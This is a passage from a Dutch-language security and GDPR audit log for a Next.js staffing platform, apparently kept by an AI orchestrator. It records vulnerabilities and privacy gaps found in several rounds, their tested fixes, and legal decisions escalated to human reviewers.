allowlists en document-ownership-poorten (CWE-203-404-pariteit) zijn intact en dekken de bekende klassen.

### OPGELOST — MIDDEL (privacy/AVG art. 17): franchiser-`anonymizeUser` liet de eigen `Tenant` (naam/slug + owner) staan → half-voltooide verwijdering

- **Repro (was):** een FRANCHISER met een openstaand verwijderverzoek → admin voert `anonymizeUser` uit.
  De transactie overschrijft User/profiel/bedrijf, maar raakt de door de betrokkene bezeten `Tenant`
  **niet**. `Tenant.name`/`slug` zijn self-gekozen bij aanmaak (`admin/franchises/actions.ts`,
  vrije-tekst `tenantName`) en kunnen de achternaam bevatten (bv. "Bemiddeling Jansen"); die naam wordt
  getoond in de white-label-header/`/inzicht` en bleef na "verwijdering" leesbaar. Bovendien bleef
  `Tenant.ownerUserId` naar het nu-geanonimiseerde account wijzen. `canAnonymizeUser`
  (`account-anonymization.ts`) blokkeerde alleen ADMIN/self/al-geanonimiseerd/geen-verzoek — niets over
  een levende eigen tenant.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid) + art. 5(1)(c) minimalisatie; CLAUDE.md
  "documenten/PII standaard privé, erasure moet volledig zijn". OWASP A01 (broken access control, data-
  eigenaarschap na erasure).
- **Waarom geen naam-blanking:** een tenant is een **doordraaiende** entiteit met andere leden, bedrijven
  en freelancers eronder; de naam blanken zou hun branding breken. De juiste AVG-houding is **fail-closed**:
  een verwijdering die de betrokkene nog als enige eigenaar van een operationele entiteit laat staan, kan
  niet volledig zijn — beheer moet de vestiging eerst overdragen of sluiten. Dit is een echte juridische/
  data-eigenaarschaps-tweesprong (MENSENWERK.md §5), nu in code afgedwongen i.p.v. stil half-voltooid.
- **Fix:** optionele `ownsTenant`-flag op `AnonymizationTarget`; `canAnonymizeUser` weigert wanneer gezet,
  met melding "Draag de vestiging eerst over aan een andere beheerder of sluit haar". Call-site
  (`admin/gebruikers/actions.ts`) laadt `ownedTenant: { select: { id: true } }` en zet
  `ownsTenant: user.ownedTenant !== null`. +2 unit-tests (`account-anonymization.test.ts`), rood→groen
  geverifieerd (zonder de guard faalt de nieuwe test). Geen schemawijziging, geen nieuw mutatie/auth-
  oppervlak.
- **Restrisico (geparkeerd):** de `Lead`/`LeadContact`-PII onder de tenant is **de data van de
  organisatie** (aparte verwerkingsgrondslag), niet de PII van de vertrekkende persoon — die blijft
  terecht staan; de eigen `LeadContact.body` van de betrokkene wordt al geredact. De remediatie-flow
  (tenant overdragen/sluiten) is mensenwerk; er is nog geen self-service tenant-overdrachtsflow.

### GEPARKEERD — LAAG (FG-afweging): `kvkNumber` op een publiek, niet-ingelogd ZZP-profiel

- **Repro:** een PUBLIC ZZP-profiel (`/zzp/[id]`, `profile-screen.tsx:153/539`) toont `kvkNumber` aan
  niet-ingelogde bezoekers. Het KvK-nummer is via het Handelsregister koppelbaar aan het vestigings-/
  thuisadres → scraping-baar identiteitsanker. E-mail wordt al níet publiek getoond; kvk wel.
- **Severity:** LAAG. Waarschijnlijk een bewuste ontwerpkeuze (comment bij de select), maar de combinatie
  "publiek + geen login + scraping" verdient een expliciete FG-afweging. **Geschonden beginsel (mogelijk):**
  AVG art. 5(1)(c) dataminimalisatie.
- **Aanbevolen fix:** toon `kvkNumber` alleen aan ingelogde CLIENT/na match (zoals e-mail), of achter een
  bewuste "toon zakelijke gegevens"-actie. Tweesprong voor de eigenaar/FG (zichtbaarheid ↔ vindbaarheid).

## Ronde 2026-07-24 (basis: `main` @ 93a53a7f)

Audit: orchestrator (Opus 4.8). Focus: actuele dependency-CVE's van de stack (OWASP A06 —
kwetsbare/verouderde componenten) + de merge-poort-betrouwbaarheid die security-fixes naar
`main` moet dragen. Bevinding: `main` draait **kwetsbaar** en de fix-PR zat **vast op een
flaky merge-poort**.

### OPGELOST — KRITIEK: `main` kwetsbaar voor 3 Auth.js-advisories (2× critical) via `@auth/core` ≤ 0.41.2

- **Repro (was):** `npm audit --audit-level=high --omit=dev` op `main` (`next-auth@5.0.0-beta.31`)
  → **rood**: 2 kritieke + 1 hoge advisory in de productie-auth-dependency `@auth/core` ≤ 0.41.2:
  - [GHSA-x445-f3h2-j279](https://github.com/advisories/GHSA-x445-f3h2-j279) — **critical**: OAuth
    `state`/`nonce`/PKCE-check-cookies niet gebonden aan de provider die ze aanmaakte.
  - [GHSA-7rqj-j65f-68wh](https://github.com/advisories/GHSA-7rqj-j65f-68wh) — **critical**:
    e-mailnormalizer valideert vóór Unicode-normalisatie → homoglief-`@`-bypass (identiteit).
  - [GHSA-xmf8-cvqr-rfgj](https://github.com/advisories/GHSA-xmf8-cvqr-rfgj) — **high**: `getToken()`
    gooit een ongevangen exception op een misvormde Bearer-`authorization`-header (DoS).
- **Geschonden regel:** OWASP A06 (kwetsbare/verouderde componenten); raakt A07 (auth/identiteit).
- **Fix:** gerichte bump `next-auth` `^5.0.0-beta.31` → `^5.0.0-beta.32` → trekt `@auth/core@0.41.3`
  (voorbij de kwetsbare range). Alleen `package.json` + `package-lock.json`; geen code/config.
  Ná de bump: `npm audit --audit-level=high --omit=dev` = **0 vulnerabilities**. Volledige poort
  lokaal groen (typecheck/lint/prettier/test 4910/build).
- **Waarom niet #890/#891 (bestaande bump-PR's):** die zaten vast (zie hieronder) én verhingen elk
  álle andere PR's op de rode `audit`-poort. Deze PR koppelt de bump aan de poort-reparatie zodat
  hij zichzelf betrouwbaar door de gate trekt.

### OPGELOST — HOOG (operationeel security): flaky `e2e`-timeout jamde de verplichte merge-poort

- **Repro (was):** `e2e` had `timeout-minutes: 15`. CI draait op `push` (`branches: ["**"]`) **én**
  `pull_request`, dus elke branch met een PR start twee parallelle `e2e`-runs. Op een trage runner
  (npm ci + `playwright install --with-deps` + `next build`) overschreed één run de 15-min-limiet →
  jobconclusie **`cancelled`**. Omdat `e2e` een **VERPLICHTE** statuscheck is (harde poort,
  `enforce_admins` AAN), blokkeerde die geannuleerde run de PR permanent — óók al slaagde de
  parallelle run. Concreet gevolg: **#890 (de kritieke CVE-fix) stond ~10 u vast op groen-behalve-`e2e`**
  en blokkeerde daarmee de hele merge-pijplijn (#892/#894/#895 wachtten op `audit`-groen dat #890 moest
  leveren).
- **Geschonden regel:** operationele beschikbaarheid van de security-merge-poort (fixes moeten
  betrouwbaar naar `main` kunnen). Niet direct een OWASP-item, maar het maakte een KRITIEK-fix
  onlandbaar.
- **Fix:** `e2e` `timeout-minutes` 15 → **25** (normale run ~6 min; ruime marge tegen een incidentele
  trage runner). `.github/workflows/ci.yml`.
- **Restrisico (geparkeerd, LAAG):** de dubbele `push`+`pull_request`-run blijft bestaan (verspilling +
  twee `e2e`-checkruns op dezelfde SHA). Aanbevolen vervolg: `on.push.branches` beperken tot `main`
  zodat feature-branches CI exact één keer via `pull_request` draaien. Bewust buiten deze PR gehouden
  (bredere CI-triggerwijziging, aparte review).

## Ronde 2026-07-23b (basis: `main` @ 7d285a56)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken — (1) delta-authz/IDOR/injectie/k-anonimiteit over álle sinds `62c035a6` gewijzigde
KPI-/routine-oppervlakken (time-to-fill, aging/committed-cost, signals-badges, no-show, urencriterium,
mandatory-documents, lead-retention) + hun consumers; (2) álle `/api/**`-route-handlers + upload/storage

- SSRF + webhook + cron + middleware; (3) AVG betrokkenen-rechten (erasure veld-voor-veld per PII-model),
  dataminimalisatie, retentie, PII-in-logs, verwerkingsregister, cross-border. Kader: OWASP Top 10
  (A01/A03/A05/A10) + ASVS + AVG art. 5/9/17/30/32. Stack voorbij bekende CVE's (Next.js 15.5.19 voorbij
  CVE-2025-29927, Auth.js v5-beta.31, Prisma 6.19.3). `npm audit --production` = 0; drie dev-only
  DoS-advisories (brace-expansion/esbuild-Windows/js-yaml) niet productie-reachable.

**Oppervlakken (1) en (2) onafhankelijk schoon** — elke by-`[id]`/`[...key]`-route dekt
auth→rol→ownership/tenant→audit met existence-oracle-veilige 404; media/`[...key]` dubbel-guarded
(logoKey-match + `resolve()` traversal-reject); uploads magic-byte-gesnift; documenten sandboxed
(`CSP: sandbox; default-src 'none'`); cron fail-closed (503/401, POST-only, timing-safe Bearer); push-SSRF
allowlisted; webhook HMAC + idempotent; alle 11 CSV-exports via de canonieke `toCsv` formule-injectie-guard;
KPI's eigenaar-/company-/tenant-gescoped en geaggregeerd. **Eén concrete AVG-gap gevonden én OPGELOST
(rood→groen); overige privacy-items zijn FG-mensenwerk (twee-wegdeur) en her-geëscaleerd.**

### OPGELOST — HOOG: bron-IP op beveiligingsincidenten (`HealthIncident`) nu automatisch geredigeerd na venster (AVG art. 5(1)(c)/(e))

- **Repro (was):** de anomaliedetector (`src/lib/monitoring/detectors.ts:71-101`) legt bij een
  LOGIN_BURST/PASSWORD_RESET_FLOOD het bron-IP vast in `HealthIncident.evidence` (JSON `{ip,...}`) én
  verweeft het in de mensleesbare `summary`. Een IP-adres is een persoonsgegeven; er was géén sweep die
  dat IP ooit opruimde (alleen `audit-retention`/`webhook-event-retention`/`lead-retention` bestonden) en
  het verwerkingsregister had geen entry voor deze afgeleide incidentstore → IP's bleven onbeperkt staan.
- **Geschonden regel:** AVG art. 5(1)(c) dataminimalisatie + 5(1)(e) opslagbeperking; art. 30 (register
  onvolledig).
- **Fix:** niet-destructieve **redactie** i.p.v. wissen — het incident (type/ernst/aantal/venster) blijft
  als beveiligingssignaal bewaard, alléén het IP wordt na het venster vervangen door de bestaande
  redactie-sentinel `[verwijderd]` in **álle kolommen** die het droegen: `evidence.ip`, de vrije `summary`
  én de machine-`dedupeKey` (`auth-login-burst-<ip>-<venster>`), plus de **afgeleide kopieën** — de
  `HEALTH_INCIDENT_OPENED`-auditregel (entityId == dedupeKey) en de admin-notificatie (body == summary).
  `src/lib/health-incident-retention.ts` (pure `healthIncidentIpRetentionCutoff` + `redactIncidentIp` —
  letterlijke split/join tegen regex-injectie via een client-nabij X-Forwarded-For-IP; dedupeKey krijgt het
  rij-id als suffix voor de `@unique`-constraint; slaat `onbekend`/reeds-geredigeerd over → idempotent),
  `src/lib/health-incident-retention-task.ts` (gebatchte, idempotente update via een portabele
  `contains`/`NOT`-query op de tekstkolom + `updateMany` op de afgeleide auditregel/notificatie;
  `HEALTH_INCIDENT_IPS_REDACTED`-auditrecord zonder PII), gewired in `run-all`. Config
  `HEALTH_INCIDENT_IP_RETENTION_DAYS` staat — net als lead-retentie en anders dan de onomkeerbare
  auditlog-sweep — standaard AAN (default 90 dagen onderzoeksvenster; min-vloer 30; expliciete `0`=uit)
  omdat onbeperkte IP-retentie de overtreding ís en redactie de beveiligingswaarde niet aantast. Register
  (#12) + retentieschema (`auditlog-beveiligingslogboeken`) bijgewerkt naar de afgedwongen redactie over
  alle kolommen + kopieën. Tests: `health-incident-retention.test.ts` (+12) en
  `health-incident-retention-task.test.ts` (+10, rood→groen: o.a. "redigeert IP uit evidence/summary/
  dedupeKey", "GEEN enkele kolom behoudt het IP" (blocker-regressie), "afgeleide auditregel+notificatie
  mee-geredigeerd", "laat verse incidenten ongemoeid", "raakt onbekend/niet-IP niet aan", idempotentie,
  batching >BATCH_SIZE, audit alleen bij redactie, expliciete-0-override).

### OPGELOST — MIDDEL: admin-notificatie + auditregel-entityId kopieerden het IP (dezelfde PII, ander pad)

- **Repro (was):** `src/lib/monitoring/monitor-task.ts` schreef bij elk incident een admin-notificatie
  (`body: f.summary`, incl. IP) én een `HEALTH_INCIDENT_OPENED`-auditregel (`entityId: f.dedupeKey`, incl.
  IP). De eerste versie van de HealthIncident-redactie raakte die kopieën niet → het IP was triviaal
  terug te halen uit een ongeredigeerde kopie (agent-review-blocker op #887).
- **Geschonden regel:** AVG art. 5(1)(c)/(e) (consistente minimalisatie over álle kopieën).
- **Fix:** de retentie-sweep redigeert de afgeleide kopieën nu mee (`auditLog.updateMany` op
  `entityId == oude dedupeKey`; `notification.updateMany` op `body == oude summary`), in dezelfde run per
  incident. Meegenomen in de OPGELOST-HOOG-fix hierboven; tests dekken beide kopieën af.

### Her-geëscaleerd (FG-mensenwerk, twee-wegdeur — ONVERANDERD open, zie eerdere rondes)

- **KRITIEK** — door-derden-geschreven vrije tekst óver de betrokkene overleeft `anonymizeUser`
  (`NoShowReport.reason`, `Performance.rejectionReason`, `Invoice.rejectionReason` REJECTED-tak,
  `Review.comment` waar `subjectId==userId`) — kan art. 9-gegevens bevatten. Beslissing (nullen vs.
  gedocumenteerde retentiegrond) is expliciet FG/juridisch, vóór echte VOG/diploma-data live gaat.
- **MIDDEL** — `AUDIT_LOG_RETENTION_DAYS` is opt-in/onbeperkt terwijl register "12 maanden" +
  "Beperkte bewaartermijn" als geïmplementeerd claimt (art. 5(2) verantwoordingsplicht). Bevestig dat
  Railway-prod het zet, óf default AAN zoals lead-/incident-retentie.
- **MIDDEL** — `Expense.description` overleeft erasure terwijl `Performance.description` (structureel
  gelijk) wél wordt geredigeerd; inconsistente fiscale-retentie-afweging.
- **LAAG** — Geoapify (routing/geocoding-derde) ontbreekt in het verwerkingsregister; hangt op de
  werkelijke granulariteit van de doorgegeven locatie (stad vs. adres).

## Ronde 2026-07-23 (basis: `main` @ b8f0a6e3)

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) delta-authz/IDOR/injectie over álle sinds `78838f25` gewijzigde bestanden, met focus op
de cross-origin-isolatie/`resource-headers`-refactor (7 document-/PDF-/media-routes) en de nieuwe
KPI-oppervlakken (time-to-fill, aging/openstaand, urencriterium-tempo, `/inzicht`); (2) cross-tenant-isolatie
FRANCHISER (`tenancy.ts` + alle `franchise/**` + `admin/**` server actions) + AVG betrokkenen-rechten
(`anonymizeUser`, account-export/-anonymization). Kader: OWASP Top 10 (A01/A03/A05) + ASVS + AVG art.
5/9/17/30/32. Stack ongewijzigd voorbij bekende CVE's (Next.js 15.5.19 voorbij CVE-2025-29927, Auth.js
v5-beta.31, Prisma 6.19.3).

**Bevinding:** de header-refactor bleek een zuivere centralisatie (elke `requireActor`/ownership/tenant/audit-
keten intact, geverifieerd tegen `git show 78838f25:<path>`; `sanitizeAttachmentFilename` strip CR/LF/`"` →
geen header-injectie) met netto-hardening (COOP/CORP/Permissions-Policy). De nieuwe KPI's zijn allemaal
eigenaar-/company-gescoped, geaggregeerd (time-to-fill `MIN_SAMPLE=2`), en CSV gaat door `toCsv`
(formule-injectie-guard). Cross-tenant-isolatie fail-closed over de hele franchise-/admin-boom (geen
CWE-203-oracle); erasure ongewoon grondig. **Eén concrete AVG-gap gevonden én OPGELOST (rood→groen); de
KRITIEK-geparkeerde art. 17-derden-PII-afweging blijft FG-mensenwerk.**

### OPGELOST — MIDDEL: `Lead`/`LeadContact`-retentie nu technisch afgedwongen (AVG art. 5(1)(e), PR volgt)

- **Repro (was):** het verwerkingsregister beloofde leads "tot conversie/afvallen + 12 maanden", maar geen
  scheduled task purgde `Lead`/`LeadContact` na dat venster — beslíste leads (KLANT/NO_DEAL) mét prospect-PII
  (organisatie, contactnaam, e-mail, telefoon, vrije notities + contactlogboek) bleven onbeperkt staan. Het
  enige wispad was het handmatige `deleteLead`. De `acquisitie-leads`-`RETENTION_SCHEDULE`-regel claimde zelfs
  "technisch afgedwongen" terwijl dat alleen het handmatige pad was. Deze prospect-PII valt buiten
  `anonymizeUser` (de prospect heeft geen `User`-account) — retentie is dus de enige afdwingbare grond.
- **Geschonden regel:** AVG art. 5(1)(e) opslagbeperking / art. 5(2) verantwoordingsplicht.
- **Fix:** nieuwe geplande retentie-sweep, gemodelleerd naar `audit-retention`/`webhook-event-retention`:
  `src/lib/lead-retention.ts` (pure `leadRetentionCutoff` + `isLeadRetentionEligible` — alleen
  KLANT/NO_DEAL snoeibaar, KOUD/WARM nooit), `src/lib/lead-retention-task.ts` (gebatchte, idempotente
  `deleteMany` — `LeadContact` cascadeert mee — + `LEADS_PRUNED`-auditrecord zonder PII), gewired in
  `run-all`. Config `LEAD_RETENTION_DAYS` staat — anders dan de opslag-hygiëne-ledgers — standaard AAN op het
  belóófde venster (365 dagen; leeg/ongeldig → 365, expliciete `0` → uit, min-vloer 90) omdat prospect-PII
  onbeperkt bewaren juist de overtreding ís. Register + retentieregel-tekst bijgewerkt naar "automatisch
  afgedwongen". Tests: `lead-retention.test.ts` (+5) en `lead-retention-task.test.ts` (+8, rood→groen: o.a.
  "snoeit NOOIT actieve prospects KOUD/WARM", "dwingt standaard 365-dagen af zonder env", batching,
  idempotentie, min-vloer, audit alleen bij daadwerkelijk snoeien).

## Ronde 2026-07-22b (basis: `main` @ 78838f25)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken — (1) object-/functie-authz + IDOR + cross-tenant + mass-assignment + injectie over álle
server actions (~65 bestanden, ~140 acties); (2) API-route-handlers + upload/storage + SSRF + webhook +
middleware/auth; (3) AVG erasure-volledigheid (veld-voor-veld per PII-model), dataminimalisatie
server→client, k-anonimiteit, PII-in-logs, verwerkingsregister, cross-border. Kader: OWASP Top 10
(A01/A03/A05) + ASVS + AVG art. 5/9/17/30/32. Stack geverifieerd voorbij bekende CVE's: Next.js 15.5.19
(voorbij CVE-2025-29927 middleware-bypass), Auth.js v5-beta.31, Prisma 6.19.3; `npm audit` = 0
kwetsbaarheden. Server-action-keten (auth→rol→ownership→Zod→actie→audit) en API-authz onafhankelijk
schoon bevonden — geen nieuwe reachable IDOR/cross-tenant/mass-assignment/injectie. CSV-exports gaan
allemaal door de canonieke `toCsv` (formule-injectie-guard) — geverifieerd op alle 8 export-routes.

**Twee bevindingen gevonden en OPGELOST (rood→groen); overige geparkeerd (incl. een KRITIEK
FG-escalatie).**

### OPGELOST — HOOG: `profile-screen.tsx` over-fetchte `AvailabilityWindow.note` op de deels-publieke `/zzp/[id]` (AVG art. 5(1)(c) + mogelijk art. 9)

- **Repro:** `ProfileScreen` (rendert `/zzp/[id]` — deels-publiek/cross-party — én `/profiel`) selecteerde
  `availabilityWindows: { select: { …, note: true } }`. `note` is vrije tekst die de ZZP'er over een
  afwezigheidsvenster schrijft en kan een gezondheids-/incapaciteitsreden bevatten (bijzondere gegevens
  art. 9 — de erasure-code merkt dit veld zelf als potentieel medisch aan). Het scherm rendert `note`
  nergens (noch de beschikbaarheids-tab, noch `summarizeAvailability`/`summarizeAway`), dus het kwam
  puur onnodig in servergeheugen op een cross-party route. Dit was op **2026-06-25b** al als MIDDEL
  geparkeerd met exact deze fix; de sibling `freelancer-search.ts` wérd vorige ronde gedicht, maar
  `profile-screen.tsx` bleef ~4 weken staan.
- **Geschonden regel:** AVG art. 5(1)(c) dataminimalisatie / CLAUDE.md regel 1 (server-side) + defense-in-depth.
- **Fix:** `note: true` verwijderd uit de geneste `availabilityWindows.select` (geldt voor beide call-sites
  van het gedeelde component). Owner-only surfaces met een eigen component (bv. `/beschikbaarheid`)
  selecteren `note` waar nodig zelf. Test: `profile-overfetch.test.ts` (+1, rood→groen): de geneste
  select bevat `note` niet en behoudt de wél-getoonde velden.

### OPGELOST — HOOG: no-show-governanceflow (`NoShowReport`) ontbrak in het art. 30-verwerkingsregister (AVG art. 30)

- **Repro:** De `NoShowReport`-flow (opdrachtgever/bemiddelaar meldt een gemiste dienst met een
  vrije-tekst-`reason`; admin velt een oordeel op `/admin/no-shows`) had geen `ProcessingActivity` in
  `src/lib/compliance/processing-register.ts` en geen `RETENTION_SCHEDULE`-regel — terwijl `reason`
  onbedoeld een gezondheids-/incapaciteitsreden (art. 9) kan bevatten. Elke andere gevoelige flow
  (verificatie, belastingdelegatie) staat wél geregistreerd. Art. 30-registerlacune.
- **Geschonden regel:** AVG art. 30 (verwerkingsregister) / art. 5(2) verantwoordingsplicht.
- **Fix:** register-entry `no-show-melding-governance` toegevoegd (`sensitive: true`, grondslag
  `GERECHTVAARDIGD_BELANG`, betrokkenen + categorieën + bewaartermijn) + `RETENTION_SCHEDULE`-regel
  `no-show-meldingen`. Test: `processing-register.test.ts` (+1): entry bestaat, is `sensitive`, en de
  retentieregel is aanwezig.

### Geparkeerd — KRITIEK (FG-/juridische beslissing, MENSENWERK §5 — NIET unilateraal gefixt): door-derden-geschreven PII over de gewiste persoon overleeft `anonymizeUser` (AVG art. 17, mogelijk art. 9)

- **Repro:** `anonymizeUser` (`admin/gebruikers/actions.ts`) redacteert zeer grondig de zélf-geschreven
  vrije tekst van de gewiste ZZP'er, maar laat vrije tekst die een **andere partij** over hem schreef
  bewust staan: `NoShowReport.reason` (melder beschrijft de gemiste dienst — kan "ziek gemeld" = art. 9
  bevatten; blijft zichtbaar op `/admin/no-shows`), `Review.comment` waar `subjectId == userId`,
  `Performance.rejectionReason` / `Invoice.rejectionReason` (REJECTED-tak, door de tegenpartij
  geschreven). De inline-comments erkennen dit als een bewuste carve-out "in afwachting van
  FG/juridische sign-off"; het gat staat al ≥15 auditronden open.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid) — het recht geldt óók voor door-derden
  geschreven persoonsgegevens over de betrokkene — mogelijk art. 9.
- **Waarom geparkeerd:** twee-richtingsdeur. Redacteren van de tegenpartij-vrijetekst raakt hun
  gerechtvaardigde geschil-/dossierbelang; het is een echte juridische afweging (redacteren-en-rij-behouden
  vs. bewaargrond documenteren). Per CLAUDE.md/MENSENWERK escaleren, niet unilateraal de erasure-semantiek
  wijzigen. **Aanbeveling (forceer de beslissing nu, vóór echte VOG-/diploma-data live gaat):** (a) vrije
  tekst nullen bij erasure (rij behouden voor het legitieme dossier), óf (b) een expliciete bewaargrond
  vastleggen. Met de nieuwe register-entry (deze ronde) is de `NoShowReport`-verwerking nu tenminste
  gedocumenteerd; de erasure-beslissing zelf blijft mensenwerk.

### Geparkeerd — MIDDEL: `/api/media/[...key]` valt buiten de middleware-matcher (OWASP A05 — defense-in-depth)

- **Repro:** `matcher: ["/((?!api/auth|…|.*\\.).*)"]` sluit élk pad met een punt uit (bedoeld voor
  `feed.ics`), waardoor ook `/api/media/…​.png` de middleware niet doorloopt: geen CSP-header, geen
  maintenance-mode-poort, geen `mustChangePassword`-redirect. **Geen authz-bypass** — de route doet zelf
  `requireActor()` met live DB-statuscheck, en media serveert alleen expliciet niet-gevoelige logo's.
- **Geschonden regel:** OWASP A05 (Security Misconfiguration) / defense-in-depth.
- **Aanbevolen fix (zorgvuldig — brede blast radius):** niet de dot-uitsluiting versmallen (dan lopen
  `/public`-assets zoals `robots.txt`/`sitemap.xml`/`manifest.webmanifest` ook door de middleware en
  riskeren een login-redirect). Beter: `/api/media` expliciet als positief matcher-patroon toevoegen, óf
  CSP-/maintenance-afhandeling in de media-route zelf. Volgende run oppakken.

### Geparkeerd — LAAG: `/api/media/[...key]` leidt Content-Type af uit de bestandsextensie i.p.v. de gevalideerde opgeslagen MIME

- **Repro:** `route.ts` bepaalt Content-Type via `key.split(".").pop()`, in tegenstelling tot
  `/api/documents/[id]` (serveert de bij upload gevalideerde DB-`mimeType`) en de storage-abstractie
  (`sniffMimeType`/magic-bytes). Nu laag risico (`ALLOWED_MIME_TYPES` beperkt tot pdf/png/jpeg/webp,
  `X-Content-Type-Options: nosniff` gezet, geen SVG/HTML), maar inconsistent met het striktere patroon.
- **Aanbevolen fix:** Content-Type uit een gevalideerd `Company.logoMimeType`-veld halen i.p.v. de
  key-extensie te vertrouwen.

### OPGELOST (ronde 2026-07-23) — MIDDEL: `Lead`/`LeadContact`-retentie technisch niet afgedwongen (AVG art. 5(1)(e))

- **Repro (was):** het register (`processing-register.ts:434`) belooft leads "tot conversie/afvallen + 12
  maanden", maar geen scheduled task purgde `Lead`/`LeadContact` na dat venster (alle cron-entrypoints
  gecontroleerd — geen enkele noemde `Lead`); het enige wispad was het handmatige `deleteLead`.
- **Fix:** geplande retentie-sweep `lead-retention` (zie ronde 2026-07-23 bovenaan) — `Lead`+`LeadContact`
  (cascade) hard verwijderd voorbij het 12-maandenvenster, standaard AAN, getest rood→groen.

### Geparkeerd — MIDDEL (FG-oordeel): `Expense.description` overleeft de erasure inconsistent met `Performance.description`

- **Repro:** `anonymizeUser` redacteert `Performance.description` (vrije tekst onder een fiscale
  bewaarplicht-rij) maar niet `Expense.description` (idem model-rationale, zelfde `userId`-eigenaar).
  Al meerdere ronden geparkeerd als "FG-oordeel". Als het Performance-precedent het beleid ís, hoort
  Expense hetzelfde patroon te volgen (description nullen, `netCents`/`vatCents`/`occurredAt` behouden
  voor het fiscale grootboek).

### Geparkeerd — LAAG (observatie): Geoapify (routing) niet in het verwerkingsregister

- Locatie-querystrings verlaten de server naar een derde (Geoapify). `location` is door de gebruiker
  ingevoerde vrije tekst (stad vs. volledig adres — granulariteit onbekend). Een mens bevestigt de
  bedoelde granulariteit vóór te beslissen of een register-entry/DPA nodig is.

## Ronde 2026-07-22 (basis: `main` @ 9605ec96)

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken — (1) object-/functie-authz + IDOR + cross-tenant + mass-assignment + injectie (SQL/XSS/CSV/
open-redirect) op álle server actions + `api/**`-route-handlers; (2) AVG erasure-volledigheid (veld-voor-veld
per PII-dragend model), dataminimalisatie server→client, PII-in-logs, k-anonimiteit, cross-partij-PII —
delta-focus op PR's #861–#866 (foutlek/oracle-fix, go-live zelftest-sweep, agenda-deadline-feed, "Afwezig
t/m X"-beschikbaarheid, badge-dedup). Kader: OWASP Top 10 (A01/A03/A05) + ASVS + AVG art. 5/9/17/30/32.
Stack: Next.js 15.5.19 (voorbij CVE-2025-29927), Auth.js v5-beta.31, Prisma 6.19.3. Orchestrator verifieerde
onafhankelijk: de nieuwe agenda-`.ics`-feed (`api/agenda/feed.ics`) is HMAC-token-gated + rate-limited +
liveness-poort (geschorst/geanonimiseerd → 404) + serveert alleen het eigen rooster/deadlines van de
token-houder (geen bedragen/BTW-saldi in de events, geen `note`); de zelftest-sweep is PII-/secret-vrij
(audit slaat alleen `key`+`status` op); de nieuwe availability-helpers lezen het (mogelijk medische)
`AvailabilityWindow.note`-veld nooit uit.

**Drie bevindingen gevonden en OPGELOST (rood→groen) — alle LAAG (defense-in-depth / geen live lek), maar
concreet en getest:**

### OPGELOST — LAAG: cross-tenant existence-oracle in `admin/shift-overnames/actions.ts` (OWASP A01 / CWE-203)

- **Repro:** `loadDecidableHandoff` gooide een plain `Error("Overname-aanvraag niet gevonden.")` bij een
  ontbrekende handoff, maar liet de `AuthorizationError("Geen toegang tot deze bemiddeling-resource.")` van
  `assertSameTenant` door `toSafeActionError` woordelijk passeren — onderscheidbaar van "niet gevonden". Een
  FRANCHISER kon zo via een gegokt handoff-id aflezen of het bij een ándere tenant hoorde (cross-tenant
  existence-oracle). Was in de vorige ronde als LAAG geparkeerd ("volgende run oppakken"); exact het patroon
  dat `createFranchiseDienst`/`addAfdelingStep` al fail-closed dichtten.
- **Geschonden regel:** OWASP A01 Broken Access Control / CWE-203 Observable Discrepancy; CLAUDE.md regel 2.
- **Fix:** fail-closed `if (!handoff || !ownsViaTenant(actor, handoff.collaboration.job.tenantId)) throw new
Error("Overname-aanvraag niet gevonden.")` — identieke melding voor onbekend én cross-tenant; de
  statuscheck ("al beoordeeld") blijft ná de tenant-poort zodat een cross-tenant-status nooit lekt. Test:
  `admin/shift-overnames/oracle.test.ts` (+4, LAAG, rood→groen).

### OPGELOST — LAAG: `profile-screen.tsx` over-fetchte privé-financiële velden (AVG art. 5(1)(c), dataminimalisatie)

- **Repro:** `ProfileScreen` (`/zzp/[id]`, deels publiek/niet-geauthenticeerd) deed `freelancerProfile.findUnique`
  met een kale `include` (geen top-level `select`), waardoor `monthlyIncomeGoalCents`, `defaultMotivation` en
  `btwNumber` in servergeheugen werden geladen. Geen live lek (geen van die velden werd gerenderd), maar een
  toekomstige render-regel kon er stil één blootstellen. Vorige ronde als LAAG geparkeerd.
- **Geschonden regel:** AVG art. 5(1)(c) dataminimalisatie / CLAUDE.md defense-in-depth.
- **Fix:** kale `include` → expliciete `select` met alleen de gebruikte scalar-velden (privé-financiële velden
  vallen weg). Test: `profile-overfetch.test.ts` (+1, LAAG, rood→groen): de query heeft `select` (geen
  `include`) en bevat de drie privé-velden niet.

### OPGELOST — LAAG: `freelancer-search.ts` over-fetchte `AvailabilityWindow.note` op de CLIENT-facing discovery-browse (AVG art. 5(1)(c))

- **Repro:** `getAllPublicFreelancers` (voedt de opdrachtgever-facing `/freelancers`-browse, cross-party
  vóór een match) haalde `availabilityWindows` op zónder `select` → de volledige rij incl. het zelf-getypte
  `note`-veld (kan een reden of medische details bevatten, per de erasure-comments) in servergeheugen. Geen
  live lek (alleen voorgeformatteerde samenvattingen bereiken de client), maar een aparte query-site die de
  `profile-screen`-fix niet dekt. Gevonden door de AVG-subagent deze ronde.
- **Geschonden regel:** AVG art. 5(1)(c) dataminimalisatie / CLAUDE.md defense-in-depth.
- **Fix:** `availabilityWindows: { select: { startDate, endDate, type }, orderBy }` — identiek patroon als
  `kandidaten/page.tsx`/`dienst-fill-signal.ts`. Test: `freelancer-search-overfetch.test.ts` (+1, LAAG,
  rood→groen): de nested select bevat `note` niet.

**Herbevestigd schoon (van-nul-af her-geverifieerd door 2 subagents):** de volledige mutatieketen
(auth→rol→ownership→Zod→actie→audit) op alle server actions + `api/**`-routes, incl. audit van geweigerde
IDOR-pogingen; `/admin` drievoudig gegated (middleware + page + action); geen mass-assignment (role-velden
Zod-beperkt tot FREELANCER/CLIENT); CSV-export overal via `escapeCsvField`; geen `$queryRawUnsafe`/user-URL-
SSRF/open-redirect; enige `dangerouslySetInnerHTML` = nonce-gated theme-script; `anonymizeUser`-erasure dekt
élk zelf-geschreven vrije-tekstveld incl. secundaire kopieën (AuditLog.metadata/DomainEvent.payload/
